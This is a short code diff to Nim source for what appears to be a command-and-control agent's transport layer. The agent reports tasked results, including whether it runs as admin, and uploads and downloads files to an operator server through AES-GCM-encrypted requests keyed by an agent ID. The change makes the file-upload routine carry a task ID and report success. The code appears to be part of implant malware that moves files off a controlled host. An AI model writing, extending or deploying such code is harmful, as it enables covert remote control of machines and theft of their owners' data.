@@ -257,8 +257,10 @@ else:
       "task_id": taskId, "output": output, "error": errStr, "is_admin": isAdmin}))
     t.postWithRevert("/result/" & t.agentId, sealGCM(t.aesKey, plain))
 
-  proc uploadFile*(t: var AgentTransport; taskId: int64; filename: string; data: seq[byte]) =
-    discard t.httpDo("POST", "/upload/" & t.agentId & "/" & filename, sealGCM(t.aesKey, data))
+  proc uploadFile*(t: var AgentTransport; taskId: int64; filename: string; data: seq[byte]): bool =
+    let (code, _) = t.httpDo("POST", "/upload/" & t.agentId & "/" & filename & "?task_id=" & $taskId,
+                              sealGCM(t.aesKey, data))
+    return code == 200
 
   proc downloadFile*(t: var AgentTransport; filename: string): seq[byte] =
     let (code, resp) = t.httpDo("GET", "/dl/" & t.agentId & "/" & filename)
